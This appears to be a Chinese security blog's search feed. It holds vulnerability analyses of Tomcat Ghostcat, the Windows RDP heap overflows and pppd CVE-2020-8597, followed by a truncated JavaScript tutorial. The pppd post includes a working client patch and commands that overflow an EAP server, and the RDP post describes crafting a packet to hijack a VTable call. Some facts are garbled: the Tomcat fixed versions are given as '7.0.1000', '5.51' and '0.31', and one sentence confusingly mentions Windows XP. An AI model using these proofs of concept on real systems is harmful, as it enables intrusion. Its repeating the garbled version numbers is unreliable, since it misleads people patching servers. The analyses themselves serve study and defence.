<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Apache Tomcat Ghostcat漏洞详细分析（CVE-2020-1938）</title>
      <link href="/2020/04/02/apache-tomcat-ghostcat-lou-dong-xiang-xi-fen-xi-cve-2020-1938/"/>
      <url>/2020/04/02/apache-tomcat-ghostcat-lou-dong-xiang-xi-fen-xi-cve-2020-1938/</url>
      
        <content type="html"><![CDATA[<p>在Apache Tomcat中发现的Ghostcat漏洞（<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938" target="_blank" rel="noopener">CVE-2020-1938</a>，<a href="https://www.cnvd.org.cn/flaw/show/CNVD-2020-10487" target="_blank" rel="noopener">CNVD-2020-10487</a>）最近成为了关注的焦点，研究员发现此漏洞可以实现远程代码执行（RCE）。</p><p><a href="http://tomcat.apache.org/" target="_blank" rel="noopener">Apache Tomcat</a>是流行的开源Java servlet容器，在这篇文章中我会分析Ghostcat漏洞相关的情况，分析实现RCE可能性。</p><h3 id="0x01-AJP协议"><a href="#0x01-AJP协议" class="headerlink" title="0x01 AJP协议"></a>0x01 AJP协议</h3><p>长亭科技的安全研究员于2月20日发现了Ghostcat漏洞，<a href="https://www.chaitin.cn/en/ghostcat" target="_blank" rel="noopener">报告描述</a>该漏洞存在于Apache JServ协议（AJP）中。<a href="https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html" target="_blank" rel="noopener">AJP</a>是所使用的的Apache Tomcat的网络服务器与位于TCP连接的网络服务器后面servlet容器进行通信的二进制协议，它主要用于Web服务器与应用程序服务器或Servlet容器进行通信的集群或反向代理场景中。</p><p>这意味着HTTP连接会向客户端公开，而AJP在Web服务器（例如Apache HTTPD）和Apache Tomcat服务器之间是内部使用。AJP在Apache HTTP Server中作为模块实现，表示为mod_jk或mod_proxy_ajp，最重要的是，AJP本质上不会暴露在外部，这一点很重要，因为这是我们将在下一节中讨论的RCE方法的前提条件之一。</p><p><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2020/03/figure-1-ajp-illustration.jpg" target="_blank" rel="noopener"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2020/03/figure-1-ajp-illustration.jpg" alt="img"></a></p><p>图1. Apache JServ协议说明</p><h3 id="0x02-Ghostcat漏洞分析"><a href="#0x02-Ghostcat漏洞分析" class="headerlink" title="0x02  Ghostcat漏洞分析"></a>0x02  Ghostcat漏洞分析</h3><p>Ghostcat本身是一个本地文件包含/读取漏洞，而不是任意文件上传/写入漏洞，在<a href="https://tomcat.apache.org/security-9.html" target="_blank" rel="noopener">Apache Tomcat安全主页上</a>，Ghostcat被描述为“ AJP请求注入和潜在的远程执行代码”，关键字“潜在”用来强调Ghostcat默认情况下不是RCE漏洞。</p><p>该通报进一步详细说明了进行RCE所必需的情况：Web应用程序需要允许文件上传以及这些上传文件的存储在Web应用程序上，否则攻击者将不得不以某种方式获得对Web应用程序内容的控制权，这种情况加上将文件作为JSP处理的能力（通过漏洞实现）将使RCE成为可能<em>。</em></p><p>总之，如果Ghostcat在外部公开了Tomcat AJP Connector，这可能会带来问题，这不是推荐的配置，但是，除了暴露的AJP外，RCE的实现还需要其他一些先决条件，这些要求结合在一起后，在现实世界中很难找到。</p><p>来自巴西的著名安全研究员若昂·马托斯（JoãoMatos）确定了Ghostcat成为RCE所需的先决条件。</p><p><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2020/03/figure-2-post-identifying-the-prerequisites.jpg" target="_blank" rel="noopener"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2020/03/figure-2-post-identifying-the-prerequisites-640x348.jpg" alt="img"></a></p><p>图2.确定RCE发生前提条件</p><p>我们进一步研究了这些，如下所述：</p><p><strong>通过APP功能上传文件</strong>：第一个先决条件意味着具有文件上传功能的应用程序应该已经安装在系统中，以使RCE成为可能。如果是这种情况，对于潜在的攻击者来说，使用带有文件上传漏洞的Web应用程序本身来上传恶意Web Shell文件会更加方便，仅在上传漏洞限制某些文件扩展名（例如JPG或TXT）的情况下，才需要将文件解释为JSP。</p><p><strong>这些文件保存在文档根目录下</strong>：一旦攻击者破坏了应用程序并能够上传恶意文件，则需要将文件保存在应用程序根文件夹中。这种先决条件本身不太可能，原因有两个：1）在Java应用程序中将文件保存在其应用程序根文件夹中并不常见。2）应用程序根文件夹是临时的，因此，每当部署新版本的应用程序时，此文件夹都会被完全覆盖。</p><p>另外，从开发人员的角度来看，文件上传功能在根文件夹内上传文件几乎没有意义，因为大多数Apache Tomcat应用程序都以.WAR文件（基本上是zip文件）的形式部署。</p><p><strong>到达AJP连接端口</strong>：最后，在满足这两个先决条件之后，潜在的攻击者将必须能够通过反向代理（即外部暴露的AJP）直接从Internet到达Tomcat AJP连接端口（默认端口8009），如前所述，这不是建议的配置或常见配置。即使AJP连接器已暴露并且攻击者试图与其进行通信，由于AJP是二进制协议，他们仍将从Web服务器收到400 Bad Request响应。</p><h3 id="0x03-Ghostcat-严重性评估"><a href="#0x03-Ghostcat-严重性评估" class="headerlink" title="0x03  Ghostcat 严重性评估"></a>0x03  Ghostcat 严重性评估</h3><p>Ghostcat已经存在了十三年之久，并且影响到所有主要版本的Apache Tomcat。考虑到上述所有要求，这些要求不太可能发生在将Ghostcat变成RCE漏洞的真实世界中，攻击者需要实现这些要求，因为在现实世界中存在这些要求的可能性不大。</p><p>证明此问题的大多数PoC 在Apache Tomcat 的<em>webapps / ROOT</em>内都已经有一个<em>webshell.txt</em>文件，因此可以在利用Ghostcat之前启用RCE。在实际情况下，网络内部的攻击者可能能够利用此漏洞执行横向移动，因为他们可以直接到达AJP连接。但是，为了使他们达到攻击的这一阶段，仍然需要在webapps /文件夹内上传恶意文件（例如webshell）以使用Ghostcat LFI漏洞，然后无论是否使用了Windows XP都强制将文件解释为JSP。</p><h3 id="0x04-Ghostcat补丁程序"><a href="#0x04-Ghostcat补丁程序" class="headerlink" title="0x04  Ghostcat补丁程序"></a>0x04  Ghostcat补丁程序</h3><p>Apache Tomcat团队为解决Ghostcat所做的修复也应该进一步阐明其真正的局限性。在本节中，我们详细介绍9.0.31版中的代码中的补丁程序，这些补丁程序与其他版本大多具有相同的代码。</p><p>Ghostcat依赖于AJP连接器的错误配置（如下所示），默认情况下在/conf/server.xml文件中将其启用：</p><pre><code>&lt;Connector port=”8009″ protocol=”AJP/1.3″ redirectPort=”8443″ /&gt;</code></pre><p>Apache Tomcat团队从文件中注释掉了这一行，因此默认情况下在提交<a href="https://github.com/apache/tomcat/commit/4c933d80e340b4a841a672060351b2190b326782" target="_blank" rel="noopener">4c933d8</a>上禁用了AJP连接器，如图3所示。</p><p><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2020/03/figure-3-image-showing-commit-4c933d8.jpg" target="_blank" rel="noopener"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2020/03/figure-3-image-showing-commit-4c933d8-640x207.jpg" alt="img"></a></p><p>图3.显示了Commit <a href="https://github.com/apache/tomcat/commit/4c933d80e340b4a841a672060351b2190b326782" target="_blank" rel="noopener">4c933d8</a>，默认情况下它禁用了AJP连接器</p><p>上面的补丁代码本身足以阻止Ghostcat发生，因为它默认情况下会禁用AJP，仅在未使用AJP的情况下才可以这样做。</p><p>我们详细介绍第二个补丁程序，该补丁程序不一定禁用AJP，而是将其限制为默认情况下仅侦听回传接口（图4）。Apache Tomcat团队进行了其他更改以提高AJP协议的整体使用率，例如，当secretRequired属性设置为true时，强制定义一个secret（图5），他们还确保对AJP连接器的任何请求包含任意和无法识别的属性，都将收到403响应（图6）。</p><p><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2020/03/figure-4-Figure-4.-image-showing-commit-0e8a50f0.jpg" target="_blank" rel="noopener"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2020/03/figure-4-Figure-4.-image-showing-commit-0e8a50f0-640x312.jpg" alt="img"></a></p><p>图4.显示Commit <a href="https://github.com/apache/tomcat/commit/0e8a50f0a5958744bea1fd6768c862e04d3b7e75" target="_blank" rel="noopener">0e8a50f0</a>，强制AJP协议默认侦听回传地址，而不是0.0.0.0。</p><p><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2020/03/figure-5-image-showing-commit-9ac90532.jpg" target="_blank" rel="noopener"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2020/03/figure-5-image-showing-commit-9ac90532-640x606.jpg" alt="img"></a></p><p>图5.显示Commit <a href="https://github.com/apache/tomcat/commit/9ac90532e9a7d239f90952edb229b07c80a9a3eb" target="_blank" rel="noopener">9ac90532</a>，检查参数secretRequired是否设置为“ true”以及是否存在secret</p><p><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2020/03/figure-6-image-showing-commit-64fa5b99.jpg" target="_blank" rel="noopener"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2020/03/figure-6-image-showing-commit-64fa5b99-640x523.jpg" alt="img"></a></p><p>图6.显示Commit <a href="https://github.com/apache/tomcat/commit/64fa5b99442589ef0bf2a7fcd71ad2bc68b35fad" target="_blank" rel="noopener">64fa5b99</a>，如果它包含任意和无法识别的属性，它将使用403的消息响应阻止对AJP连接器的请求</p><h3 id="0x05-分析总结"><a href="#0x05-分析总结" class="headerlink" title="0x05  分析总结"></a>0x05  分析总结</h3><p>鉴于本文中已讨论的所有内容，对于用户来说，即使Ghostcat默认不是RCE，也要意识到Ghostcat仍然会带来风险，这一点仍然很重要。该漏洞已经存在公网利用 ，应该促使用户尽快将其Tomcat更新到最新版本，以减少被利用的风险。</p><p>Apache Tomcat已发布以下版本的Tomcat的修复程序：</p><ul><li><a href="https://tomcat.apache.org/security-7.html" target="_blank" rel="noopener">Tomcat 7</a>（版本7.0.1000）</li><li><a href="https://tomcat.apache.org/security-8.html" target="_blank" rel="noopener">Tomcat 8</a>（版本5.51）</li><li><a href="https://tomcat.apache.org/security-9.html" target="_blank" rel="noopener">Tomcat 9</a>（版本0.31）</li></ul><p>如果不是立即更新，则不使用AJP连接器服务的用户应改为通过注释或将其从$ CATALINA_HOME / conf / server.xml中完全删除或重新启动Tomcat来禁用它，类似于Apache Tomcat采取的操作。</p><p>除了将Tomcat升级到最新版本外，如果正在使用AJP连接器服务，请按照<a href="https://www.chaitin.cn/en/ghostcat" target="_blank" rel="noopener">Chaitin</a>的建议将“ secret”属性设置为已定义的AJP协议身份验证凭据，如下所示：</p><pre><code>&lt;Connector protocol=”AJP/1.3″address=”::1″port=”8009″redirectPort=”8443″secretRequired=”true”secret=”YOUR_SECRET_HERE” /&gt;</code></pre><p>由于默认情况下使用嵌入式版本的Tomcat，因此使用Spring Boot框架的应用程序也可能会受到此漏洞的影响，这些应用程序的用户还应该对此进行进一步研究，以确保它们不受Ghostcat的影响。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows RDP 协议堆溢出漏洞分析（CVE-2019-1181 &amp; CVE-2019-1182）</title>
      <link href="/2020/04/02/windows-rdp-xie-yi-dui-yi-chu-lou-dong-fen-xi-cve-2019-1181-cve-2019-1182/"/>
      <url>/2020/04/02/windows-rdp-xie-yi-dui-yi-chu-lou-dong-fen-xi-cve-2019-1181-cve-2019-1182/</url>
      
        <content type="html"><![CDATA[<p>2019年8月，微软公布了一系列RDP漏洞的补丁更新，其中两个是可蠕虫的RDP漏洞，从Windows 7到Windows 10，漏洞CVE-2019-1181和CVE-2019-1182会影响这之间的所有操作系统。</p><p>RDP客户端和服务器中都存在易受攻击的代码，因此可以在任一方进行漏洞利用。</p><h3 id="0x01-补丁比较"><a href="#0x01-补丁比较" class="headerlink" title="0x01 补丁比较"></a>0x01 补丁比较</h3><p><a href="https://www.malwaretech.com/wp-content/uploads/2019/08/BinDiff.png" target="_blank" rel="noopener"><img src="https://www.malwaretech.com/wp-content/uploads/2019/08/BinDiff.png" alt="img"></a></p><p>BinDiff下分析RDPCoreTS.dll（在Windows 7上的RDP相关文件）。</p><p>从以前分析RDP的经验来看，DecodeFormatData和SendFormatDataRequest函数只能是在身份验证后才可调用，修复后仅保留解压缩功能。</p><p><a href="https://www.malwaretech.com/wp-content/uploads/2019/08/CodeComparison.png" target="_blank" rel="noopener"><img src="https://www.malwaretech.com/wp-content/uploads/2019/08/CodeComparison.png" alt="img"></a></p><p>未修补和修补丁的解压缩功能之间的比较。</p><p>原始代码（左）有些混乱，因为它已被优化为了一个if语句，补丁代码（右）也有些混乱，并且具有一些附加的验证。</p><p>第24行添加了代码，用于检查v11 + 0x2000是否小于v11。如果条件为真，则会设置一个错误代码，随后将导致函数中止。</p><p>如何将0x2000添加到整数使其比以前更小？答案是：通过整数溢出漏洞。</p><p>无符号整数是4个字节，可以保存0到0xFFFFFFFF之间的任何值（4,294,967,295‬）。如果整数增加到超过最大值，则循环到零。因此，如果v11为0xFFFFFFFF，则向其添加0x2000将导致最终值0x1FFF，该值小于原始值。</p><p>v11用作通过“ new”运算符执行的堆分配的大小，这里的假设是，如果我们可以溢出v11，它将导致分配的大小小于解压缩的数据，从而导致堆溢出。</p><h3 id="0x03-动态调试"><a href="#0x03-动态调试" class="headerlink" title="0x03  动态调试"></a>0x03  动态调试</h3><p>为了更好地理解如何利用整数溢出，我需要知道我控制的值以及如何调用易受攻击的函数。为此，我对DecompressUnchopper :: DecompressUnchopper（DecompressUnchopper类的初始化函数）进行了堆栈回溯，找到利用此类的函数：CRdpDynVCMgr :: HandleIncomingDvcData。</p><p>从我以前对RDP的分析，我知道DynVC是“ Dynamic Virtual Channel”的缩写，DVC接口允许客户端和服务器上的模块之间进行通信，并支持原始数据和压缩数据，发送压缩数据可能会破坏易受攻击的“解压缩”功能。</p><p>我已经编写了用于利用BlueKeep的自定义RDP客户端，我添加了代码以打开DVC通道并发送一些测试数据。</p><p><a href="https://www.malwaretech.com/wp-content/uploads/2019/08/SendDvcData.png" target="_blank" rel="noopener"><img src="https://www.malwaretech.com/wp-content/uploads/2019/08/SendDvcData.png" alt="img"></a></p><p>将字符串“ MalwareTech123”发送到DVC通道。</p><p>将调试器附加到RDP服务器进程后，我在DecompressUnchopper :: Decompress上设置了一个断点并运行了我的代码。</p><p><a href="https://www.malwaretech.com/wp-content/uploads/2019/08/DecompressBreakpoint.png" target="_blank" rel="noopener"><img src="https://www.malwaretech.com/wp-content/uploads/2019/08/DecompressBreakpoint.png" alt="img"></a>DecompressUnchopper :: Decompress上的断点。</p><p>rdx（第二个参数）是我发送的测试数据，而r8（第三个参数）是数据长度，现在知道了函数参数，便可以清理反编译的代码了。</p><p><a href="https://www.malwaretech.com/wp-content/uploads/2019/08/DecompressFunction-1.png" target="_blank" rel="noopener"><img src="https://www.malwaretech.com/wp-content/uploads/2019/08/DecompressFunction-1.png" alt="img"></a></p><p>清理后的代码。</p><p>可以触发崩溃。</p><h3 id="0x03-堆溢出分析"><a href="#0x03-堆溢出分析" class="headerlink" title="0x03  堆溢出分析"></a>0x03  堆溢出分析</h3><p>为了通过使RDP服务器崩溃来测试漏洞，我制作了一个恶意DVC数据包。</p><p><a href="https://www.malwaretech.com/wp-content/uploads/2019/08/SendDvcCrash.png" target="_blank" rel="noopener"><img src="https://www.malwaretech.com/wp-content/uploads/2019/08/SendDvcCrash.png" alt="img"></a></p><p>构建恶意DVC数据包。</p><p>我将uncompressedSize字段设置为1 – 0x2000（0xFFFFE001‬），以便在添加0x2000时它将循环到1，然后将压缩数据设置为字母’A’重复0x200次，这将导致堆缓冲区被0x1FF字节溢出。</p><p>现在我可以将任意大小的任意数据写入相邻的堆分配了，该漏洞之所以严重，是因为对象实例存储在同一堆中，从而有可能覆盖它们。</p><p>例如，我更改了对象的VTable指针，以便应用程序通过地址0x1337133713371337执行ptr调用。</p><p><a href="https://www.malwaretech.com/wp-content/uploads/2019/08/VTableCall.png" target="_blank" rel="noopener"><img src="https://www.malwaretech.com/wp-content/uploads/2019/08/VTableCall.png" alt="img"></a></p>]]></content>
      
      
      <categories>
          
          <category> RDP </category>
          
          <category> Vul </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pppd中缓冲区溢出漏洞调试分析（CVE-2020-8597）</title>
      <link href="/2019/12/02/pppd-zhong-huan-chong-qu-yi-chu-lou-dong-diao-shi-fen-xi-cve-2020-8597/"/>
      <url>/2019/12/02/pppd-zhong-huan-chong-qu-yi-chu-lou-dong-diao-shi-fen-xi-cve-2020-8597/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01  漏洞描述"></a>0x01  漏洞描述</h3><p>此漏洞编号为CVE-2020-8597，未经身份验证的攻击者可以利用此漏洞在受影响的系统上远程执行任意代码并对其进行完全控制。</p><p>攻击者所需要做的就是向受攻击的ppp客户端或服务器发送未经请求的格式错误的EAP数据包。</p><p>此外，由于pppd通常以高特权运行并与内核驱动程序一起工作，因此该漏洞可能使攻击者有可能利用系统或root级特权来执行恶意代码。</p><p>此漏洞是由于在将提供的数据复制到内存之前验证输入大小时出错了。由于数据大小的验证不正确，因此任意数据都可以复制到内存中并导致内存损坏，可能导致执行恶意代码。</p><p>该漏洞存在于eap解析代码的逻辑中，特别是在eap.c中由网络输入处理程序调用的eap_request（）和eap_response（）函数中。  </p><h3 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h3><p>这篇文章我会分析并复现CVE-2020-8597漏洞，此漏洞是<code>pppd</code>文件中的一个缓冲区溢出漏洞。</p><p>使用<code>pppd</code>最新版本，源码编译<code>2.4.8</code>版本的<code>pppd</code>文件。</p><p>为了实现这一目标，我们需要两个通过虚拟串行端口连接的虚拟机，我通常使用VirtualBox，因为它是开源的，但是在其他虚拟机管理程序上也应使用相同的配置。</p><p>我启动了两个虚拟机：</p><ul><li><code>pppd-server</code></li><li><code>pppd-client</code></li></ul><p>串行配置设置<code>pppd-server</code>如下所示：</p><p><a href="https://camo.githubusercontent.com/0a2586b9dfb262b66aa04680b3176686f6ca934e/68747470733a2f2f676973742e6769746875622e636f6d2f6e737461726b652f35353134333362636337326666393535383865313638613062623636363132342f7261772f383631306634303462363163353437643835353630636362666261373338303461663539366362322f303030312d7365727665722d73657269616c2d636f6e6669672e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/0a2586b9dfb262b66aa04680b3176686f6ca934e/68747470733a2f2f676973742e6769746875622e636f6d2f6e737461726b652f35353134333362636337326666393535383865313638613062623636363132342f7261772f383631306634303462363163353437643835353630636362666261373338303461663539366362322f303030312d7365727665722d73657269616c2d636f6e6669672e706e67" alt="服务器串行配置"></a></p><p>串行配置设置<code>pppd-client</code>如下所示：</p><p><a href="https://camo.githubusercontent.com/5011c404ff587f909c51998678d1ccb7a41773d9/68747470733a2f2f676973742e6769746875622e636f6d2f6e737461726b652f35353134333362636337326666393535383865313638613062623636363132342f7261772f383631306634303462363163353437643835353630636362666261373338303461663539366362322f303030322d636c69656e742d73657269616c2d636f6e6669672e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/5011c404ff587f909c51998678d1ccb7a41773d9/68747470733a2f2f676973742e6769746875622e636f6d2f6e737461726b652f35353134333362636337326666393535383865313638613062623636363132342f7261772f383631306634303462363163353437643835353630636362666261373338303461663539366362322f303030322d636c69656e742d73657269616c2d636f6e6669672e706e67" alt="客户端串行配置"></a></p><p>配置串行设置后，启动并安装选择的Linux Distribution，我使用的是了<code>Ubuntu 19.10</code>，任何Linux发行版都可以使用。</p><p>确保<code>pppd-server</code>虚拟机启动前启动<code>pppd-client</code>VM。</p><p>现在我们需要测试串行连接的连通性：</p><p><a href="https://camo.githubusercontent.com/ff563e261089ad8dbadd90686427fc99fb398d74/68747470733a2f2f676973742e6769746875622e636f6d2f6e737461726b652f35353134333362636337326666393535383865313638613062623636363132342f7261772f383631306634303462363163353437643835353630636362666261373338303461663539366362322f303030332d74657374696e672d73657269616c2d636f6e6e656374696f6e2e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/ff563e261089ad8dbadd90686427fc99fb398d74/68747470733a2f2f676973742e6769746875622e636f6d2f6e737461726b652f35353134333362636337326666393535383865313638613062623636363132342f7261772f383631306634303462363163353437643835353630636362666261373338303461663539366362322f303030332d74657374696e672d73657269616c2d636f6e6e656374696f6e2e706e67" alt="测试串行连接"></a></p><p>系统安装完成并且测试成功时，我们将需要一些软件包才能使用pppd：</p><pre><code># apt install build-essential gdb libssl-dev</code></pre><p>然后，我们继续clone <code>ppp</code>存储库：</p><pre><code>$ git clone https://github.com/paulusmack/ppp.git ~/ppp</code></pre><p>现在在服务器上，我们make并安装<code>ppp</code>：</p><pre><code>$ git checkout ppp-2.4.8$ cd ~/ppp$ ./configure$ make# make install</code></pre><p>现在，我们已经为服务器安装<code>pppd</code>了，接下来，重复步骤安装<code>pppd-client</code>。</p><p>至此，我们<code>pppd</code>在两个系统上都有一个版本，然后，我们需要测试连接。</p><p>首先，在服务器上，运行以下命令：</p><pre><code># pppd /dev/ttyS0 9600 noauth local lock defaultroute debug nodetach 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8</code></pre><p>接下来，在客户端上，运行以下命令：</p><pre><code># pppd noauth local lock defaultroute debug nodetach /dev/ttyS0 9600</code></pre><p>现在我们应该看到连接是通的：</p><p><a href="https://camo.githubusercontent.com/28fd4912679245852cafa956f4c5aa4a56733831/68747470733a2f2f676973742e6769746875622e636f6d2f6e737461726b652f35353134333362636337326666393535383865313638613062623636363132342f7261772f383631306634303462363163353437643835353630636362666261373338303461663539366362322f303030352d696e697469616c2d636f6e6e656374696f6e2e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/28fd4912679245852cafa956f4c5aa4a56733831/68747470733a2f2f676973742e6769746875622e636f6d2f6e737461726b652f35353134333362636337326666393535383865313638613062623636363132342f7261772f383631306634303462363163353437643835353630636362666261373338303461663539366362322f303030352d696e697469616c2d636f6e6e656374696f6e2e706e67" alt="初始连接"></a></p><p>接下来需要实现<code>EAP MD5-Challenge</code>，我们可以通过调整服务器命令并在服务器文件系统上添加文件来做到这一点。</p><p>需要添加的文件<code>/etc/ppp/chap-secrets</code>应该是这样的：</p><pre><code>admin   *       password        *</code></pre><p>解释一下：</p><ul><li><code>admin</code> 是用户名</li><li>第一个*是服务器名称</li><li><code>password</code> 是连接密码</li><li>第二个*是客户端名称</li></ul><p>现在，我们将服务器命令调整为：</p><pre><code># pppd /dev/ttyS0 9600 auth local lock defaultroute debug nodetach 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap</code></pre><p>我们需要做的最后一件事是对<code>pppd-client</code>pppd二进制文件进行一些更改，在<code>pppd-client</code>上，清理位置<code>~/ppp</code>的ppp项目：</p><pre><code>$ make clean</code></pre><p>然后应用以下补丁：</p><pre><code>diff --git a/pppd/eap.c b/pppd/eap.cindex 082e953..0754597 100644--- a/pppd/eap.c+++ b/pppd/eap.c@@ -75,8 +75,7 @@ #ifndef SHA_DIGESTSIZE #define        SHA_DIGESTSIZE 20 #endif--+#define PAYLOAD_SIZE 1024 eap_state eap_states[NUM_PPP];         /* EAP state; one for each unit */ #ifdef USE_SRP static char *pn_secret = NULL;         /* Pseudonym generating secret */@@ -1392,8 +1391,8 @@ int len; #endif /* USE_SRP */                eap_send_response(esp, id, typenum, esp-&gt;es_client.ea_name,                    esp-&gt;es_client.ea_namelen);-               break;+               break;        case EAPT_NOTIFICATION:                if (len &gt; 0)                        info(&quot;EAP: Notification \&quot;%.*q\&quot;&quot;, len, inp);@@ -1457,8 +1456,12 @@ int len;                BZERO(secret, sizeof (secret));                MD5_Update(&amp;mdContext, inp, vallen);                MD5_Final(hash, &amp;mdContext);-               eap_chap_response(esp, id, hash, esp-&gt;es_client.ea_name,-                   esp-&gt;es_client.ea_namelen);+               char payload[PAYLOAD_SIZE];+               memset(payload, &#39;A&#39;, PAYLOAD_SIZE - 1);+               payload[PAYLOAD_SIZE] = &#39;\0&#39;;+               eap_chap_response(esp, id, hash, payload, PAYLOAD_SIZE);+               //eap_chap_response(esp, id, hash, esp-&gt;es_client.ea_name,+                //   esp-&gt;es_client.ea_namelen);                break; #ifdef USE_SRP</code></pre><p>可以通过将其保存为以下文件来应用此补丁：</p><pre><code>$ git apply client-payload.patch</code></pre><p><code>client-payload.patch</code>是我们保存了上述补丁文件名。</p><p>我选择使用修改<code>pppd</code>二进制文件的方法，以避免不得不编写<code>LCP</code>进行协商整个握手过程的<code>ppp</code>脚本。尽管可以使用<code>scapy</code>和来制作自己的<code>pyserial</code>客户端，但修改现有<code>pppd</code>二进制文件可以简化这一步骤。</p><p>现在重新编译项目：</p><pre><code>$ ./configure$ make# make install</code></pre><p>现在我们将client命令调整为：</p><pre><code># pppd auth local lock defaultroute debug nodetach /dev/ttyS0 960</code></pre><p>然后我们首先运行服务器命令，然后运行以下客户端命令：</p><pre><code># pppd noauth local lock defaultroute debug nodetach /dev/ttyS0 9600 user notadmin password notpassword</code></pre><p>现在在服务器上看到崩溃现场：</p><p><a href="https://camo.githubusercontent.com/0baddede9f305d70cda9deda31036d146ca8207a/68747470733a2f2f676973742e6769746875622e636f6d2f6e737461726b652f35353134333362636337326666393535383865313638613062623636363132342f7261772f383631306634303462363163353437643835353630636362666261373338303461663539366362322f303030362d63726173682e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/0baddede9f305d70cda9deda31036d146ca8207a/68747470733a2f2f676973742e6769746875622e636f6d2f6e737461726b652f35353134333362636337326666393535383865313638613062623636363132342f7261772f383631306634303462363163353437643835353630636362666261373338303461663539366362322f303030362d63726173682e706e67" alt="崩溃"></a></p><p>现在要验证此补丁程序，因此在服务器上运行：</p><pre><code>$ make clean$ git checkout master$ ./configure$ make# make install</code></pre><p>然后重复最后的服务器+客户端命令，没有看到崩溃：</p><p><a href="https://camo.githubusercontent.com/2444411f283f58ba1e44ac8f48c5d5f674842453/68747470733a2f2f676973742e6769746875622e636f6d2f6e737461726b652f35353134333362636337326666393535383865313638613062623636363132342f7261772f383631306634303462363163353437643835353630636362666261373338303461663539366362322f303030372d6e6f2d63726173682e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/2444411f283f58ba1e44ac8f48c5d5f674842453/68747470733a2f2f676973742e6769746875622e636f6d2f6e737461726b652f35353134333362636337326666393535383865313638613062623636363132342f7261772f383631306634303462363163353437643835353630636362666261373338303461663539366362322f303030372d6e6f2d63726173682e706e67" alt="没有崩溃"></a></p><h3 id="0x03-参考资料"><a href="#0x03-参考资料" class="headerlink" title="0x03  参考资料"></a>0x03  参考资料</h3><ul><li><a href="https://github.com/paulusmack/ppp/commit/8d7970b8f3db727fe798b65f3377fe6787575426" target="_blank" rel="noopener">https://github.com/paulusmack/ppp/commit/8d7970b8f3db727fe798b65f3377fe6787575426</a></li><li><a href="https://www.virtualbox.org/wiki/PPP_Tunnel" target="_blank" rel="noopener">https://www.virtualbox.org/wiki/PPP_Tunnel</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> stackoverflow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javascript基础学习总结</title>
      <link href="/2019/08/27/javascript-ji-chu-xue-xi-zong-jie/"/>
      <url>/2019/08/27/javascript-ji-chu-xue-xi-zong-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>JavaScript 是一种脚本语言，学一种编程语言，首先就要从这种语言的基础语法入手。本节我们就将对 JavaScript 的基础语法进行学习。</p><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><ul><li>JavaScript 是什么</li><li>变量</li><li>数字与运算符</li><li>数组　</li><li>null &amp; undefined</li><li>字符串</li><li>类型转换</li></ul><h2 id="什么是-JavaScript"><a href="#什么是-JavaScript" class="headerlink" title="什么是 JavaScript"></a>什么是 JavaScript</h2><p>JavaScript，通常缩写为 JS，是一种高级的，解释执行的编程语言。JavaScript 是一门基于原型、函数先行的语言，是一门多范式的语言，它支持面向对象编程，命令式编程，以及函数式编程。它提供语法来操控文本、数组、日期以及正则表达式等，不支持 I/O，比如网络、存储和图形等，但这些都可以由它的宿主环境提供支持。它已经由 ECMA（欧洲计算机制造商协会）通过 ECMAScript 实现语言的标准化。它被世界上的绝大多数网站所使用，也被世界主流浏览器（Chrome、IE、Firefox、Safari、Opera）支持。</p><p>虽然 JavaScript 与 Java 这门语言不管是在名字上，或是在语法上都有很多相似性，但这两门编程语言从设计之初就有很大的不同，JavaScript 的语言设计主要受到了 Self（一种基于原型的编程语言）和 Scheme（一门函数式编程语言）的影响。在语法结构上它又与C语言有很多相似（例如 if 条件语句、while 循环、switch 语句、do-while 循环等）。</p><p>在客户端，JavaScript 在传统意义上被实现为一种解释语言，但在最近，它已经可以被即时编译（JIT）执行。随着最新的 HTML5 和 CSS3 语言标准的推行它还可用于游戏、桌面和移动应用程序的开发和在服务器端网络环境运行，如 Node.js。</p><h4 id="JavaScript-的组成"><a href="#JavaScript-的组成" class="headerlink" title="JavaScript 的组成"></a>JavaScript 的组成</h4><ul><li>ECMAScript：JavaScript 的语法标准。</li><li>DOM：JavaScript 操作网页上的元素的 API。</li><li>BOM：JavaScript 操作浏览器的部分功能的 API。</li></ul><h4 id="JavaScript-的特点"><a href="#JavaScript-的特点" class="headerlink" title="JavaScript 的特点"></a>JavaScript 